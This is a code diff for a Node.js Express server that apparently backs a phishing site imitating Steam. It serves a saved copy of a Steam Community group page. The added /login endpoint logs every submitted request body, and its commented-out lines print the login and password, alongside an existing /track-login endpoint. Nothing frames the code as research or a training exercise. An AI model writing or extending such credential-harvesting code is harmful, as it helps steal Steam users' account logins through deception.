@@ -24,6 +24,17 @@ app.post("/track-login", (req, res) => {
     res.json({ message: "Дані отримані успішно!" });
 });
 
+app.post("/login", (req, res) => {
+    console.log(req.body);
+    //const { login, password } = req.body;
+
+    //console.log("Success!");
+    //console.log("Login:", login);
+    //console.log("Password:", password);
+
+    res.json({ message: "Дані отримані успішно!" });
+});
+
 app.get("/group/", (req, res) => {
     console.log("GROUP");
     res.sendFile(path.join(__dirname, "group", "Спільнота Steam __ Група __ Один раз не....html"));
